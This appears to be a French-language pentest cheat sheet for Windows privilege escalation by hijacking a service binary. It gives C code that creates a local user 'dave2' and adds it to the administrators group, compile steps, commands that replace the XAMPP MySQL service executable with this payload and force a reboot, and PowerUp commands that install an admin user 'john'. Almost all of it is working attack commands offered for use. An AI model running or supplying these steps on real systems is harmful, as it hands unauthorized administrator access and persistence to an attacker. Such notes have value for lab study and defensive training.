# Créer service
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~sh
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Remplacer le service
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
net stop mysql
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Si ça ne fonctionne pas, vérifier si il se lance au redémarrage
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vérifier si droits de redémarrer: **whoami /priv** (SeShutDownPrivilege)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
shutdown /r /t 0
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# PowerUp
**Get-ModifiableServiceFile** liste services modifiables
Peut remplacer un service qui créé usager: **john** avec passe: **Password123!** comme admin 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Install-ServiceBinary -Name 'mysql'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
